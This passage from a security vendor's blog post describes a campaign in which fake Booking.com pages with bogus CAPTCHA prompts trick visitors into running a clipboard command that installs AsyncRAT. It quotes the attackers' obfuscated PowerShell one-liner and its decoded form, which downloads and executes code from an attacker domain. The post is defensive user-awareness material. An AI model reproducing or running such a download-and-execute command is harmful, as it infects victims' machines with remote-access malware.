# Victims risk AsyncRAT infection after being redirected to fake Booking.com sites

Posted: June 2, 2025

Cybercriminals have started a campaign of redirecting links placed on gaming sites and social media—and as sponsored ads—that lead to fake websites posing as Booking.com. According to Malwarebytes [research](https://www.malwarebytes.com/blog/personal/2025/03/1-in-10-people-do-nothing-to-stay-secure-and-private-on-vacation), 40% of people book travel through a general online search, creating a lot of opportunities for scammers.

The first signs of the campaign showed up mid-May and the final redirect destination changes every two to three days.

Following the links brings visitors to a familiar strategy where fake CAPTCHA websites hijack your clipboard and try to trick visitors into infecting their own device.

![fake Captcha](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/05/fake_booking_sites_captcha.png)

fake Captcha prompt

As usual on these websites, by putting a checkmark in the fake Captcha prompt you’re giving the website permission to copy something to your clipboard.

Afterwards, the scammers involved will try to have the visitor execute a Run command on their computer. This type of prompt is never used in legitimate Captcha forms and should be immediately suspicious to all individuals.

instructions to infect your own device

If you’re using Chrome, you may see this warning:

![Chrome warns but for what?](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/05/Chrome_warning.png)

Chrome issues a warning but it may the danger may be unclear to users

The warning is nice, but it’s not very clear what this warning is for, in my opinion.

Users of Malwarebytes’ Browser Guard will see this warning:

Malwarebytes Browser Guard’s clipboard warning

“Hey, did you just copy something?

Heads up, your clipboard was just accessed from this website. Be sure you trust the owner before passing this someplace you don’t want it. Like a terminal or an email to your boss.”

Well, either way, don’t just discard these warnings. Even if you think you’re looking at an actual booking website, this is not the kind of instructions you’re expected to follow.

What the website just put on the clipboard may look like gobbledegook to some, though more experienced users will see the danger.

`pOwERsheLl –N"O"p"rO" /w h -C"Om"ManD "$b"a"np = 'b"kn"g"n"et.com';$r"k"v = I"n"v"o"k"e-"R"e"stMethod -Uri $ba"n"p;I"nv"oke"-"E"xp"r"es"sion $r"k"v"`

The cybercriminals used mixed casing, quote interruption, and variable name manipulation to hide their true intentions, but what it actually says (and does if you follow the instructions) is:

`powershell -NoProfile -WindowStyle Hidden -Command "$banp = 'bkngnet.com'; $rkv = Invoke-RestMethod -Uri $banp; Invoke-Expression $rkv"`

The malicious Captcha form tells the user to copy the content of the clipboard into the Windows Run dialog box and execute the instructions from the above command. When Browser Guard detects that the text copied to the clipboard contains this kind of potentially malicious command, it will add the phrase...
